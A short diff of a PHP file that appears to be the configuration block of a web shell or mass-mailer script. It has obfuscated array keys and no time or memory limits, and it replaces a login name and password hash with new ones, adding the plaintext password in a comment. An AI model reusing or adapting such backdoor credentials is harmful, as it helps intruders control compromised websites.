@@ -2,8 +2,8 @@
 set_time_limit(0);
 ini_set('memory_limit', '-1');
 $ChJEsJbrSOGlr = array(
-	'usgytpFkh' => 'bunnyman',
-	'palWPdgjTXOHXXOD' => '28a5323655d10745e75362a444e36d3b',
+	'usgytpFkh' => 'Lucenox',
+	'palWPdgjTXOHXXOD' => 'f7a745094abe953b50e3a59f7fa75c1f', //Lucenox1337
 	'saefHqYkzpt' => '1',
 	'loVXxveqHpqlKR' => '500',
 	'shaUGtAh' => '1',
